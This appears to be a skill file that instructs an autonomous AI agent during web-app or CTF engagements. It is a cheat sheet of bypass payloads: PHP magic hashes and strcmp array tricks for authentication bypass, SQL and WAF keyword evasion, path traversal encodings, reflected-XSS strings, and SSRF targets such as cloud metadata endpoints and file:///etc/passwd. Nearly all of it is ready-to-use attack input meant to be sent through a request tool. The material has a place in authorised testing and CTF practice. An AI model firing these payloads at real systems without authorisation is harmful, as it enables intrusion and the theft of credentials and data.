---
name: web-bypass-cheats
description: Front-loaded, pre-verified cheat tables for common web/CTF pitfalls — PHP type-juggling magic hashes, comparison quirks, filter/WAF bypass encodings, SQLi/XSS/SSRF tricks. Use during web-app or CTF engagements BEFORE brute-forcing or hand-deriving these, to avoid wasting rounds on known-solved problems.
---

# Web / CTF bypass cheat tables

These are **pre-verified facts** distilled from real engagements. Reach for the table
instead of brute-forcing or re-deriving — that is exactly where autonomous runs waste
dozens of rounds. Do not "discover" what is already written here.

## PHP loose-comparison (`==`) type juggling
- `"0e123" == "0e456"` is **true**: any `0e[digits]` string is treated as `0 * 10^n = 0`.
  Two different strings whose **MD5/SHA1 starts `0e` followed by only digits** compare equal
  under `==`. To bypass `if (md5($a) == md5($b))` with `$a != $b`, use a **magic hash** below —
  ⚠️ **do not brute-force these; use the table.**
- `"abc" == 0` is **true** in PHP < 8 (non-numeric string → 0). PHP 8 fixed this.
- `in_array($x, $arr)` (loose) and `switch($x)` have the same juggling pitfalls.
- `strcmp(array(), "x")` returns **NULL** (== 0) in old PHP → auth bypass when code does
  `if (strcmp($pass, $input) == 0)`; send `input[]=` (array).

### MD5 magic hashes (raw string → MD5 is `0e…digits`)
| Input | MD5 |
|---|---|
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `aabg7XSs` | `0e087386482136013740957780965295` |
| `aabC9RqS` | `0e041022518165728065344349536299` |

### SHA1 magic hashes (SHA1 is `0e…digits`)
| Input | SHA1 |
|---|---|
| `aaroZmOk` | `0e66507019969427134894567494305185566735` |
| `aaK1STfY` | `0e76658526655756207688271159624026011393` |

## Type juggling via JSON / arrays
- Where a hash compare reads from JSON, send the values as **numbers** or **arrays** so the two
  sides become `null`/array and compare equal.
- `md5(array())` is `NULL`; `if (md5($_GET['x']) == "...")` with `x[]=` → NULL == string is false,
  but **two array inputs** to a `md5($a)==md5($b)` check are both NULL → equal.

## Filter / WAF keyword bypass (apply via `syber_http_request`)
- **Case**: `SeLeCt`, `UnIoN`. **Inline comments**: `UN/**/ION SEL/**/ECT`, `/*!50000UNION*/`.
- **Whitespace**: `%09 %0a %0c %0d %a0`, `()`, `/**/`, `+` for space.
- **Encoding layers**: URL → double-URL (`%252e%252e%252f`) → unicode (`%u002e`) → overlong UTF-8.
- **Path traversal**: `../` → `..%2f` → `..%252f` → `....//` (filter strips one `../`) → `..%c0%af`.
- **Quotes**: backtick, `CHAR(0x...)`, `0x68656c6c6f` (hex literal), concatenation.

## Reflected-XSS context escapes
- HTML body: `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>`.
- Attribute: break out with `"><svg onload=...>` (need the raw `"` to survive unencoded).
- JS string: `'};alert(1);//` / `</script><svg onload=...>`.
- **Confirm execution, not reflection**: the raw `<...>` must survive un-entity-encoded.

## SSRF targets worth trying (then confirm out-of-band)
- Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS),
  `http://metadata.google.internal/computeMetadata/v1/` (GCP, needs `Metadata-Flavor: Google`).
- Scheme/parser tricks: `gopher://`, `dict://`, `file:///etc/passwd`, `http://127.0.0.1:port`,
  `http://[::1]`, decimal/octal IP (`http://2130706433/`), `@`-confusion `http://allowed@evil`.

## Quick discipline
- Magic-hash / type-juggle problems are **table lookups, not brute force**.
- Every bypass above is a *hypothesis* — verify the response actually changed
  (status/length/content), and remember a reflected payload ≠ a confirmed bug.
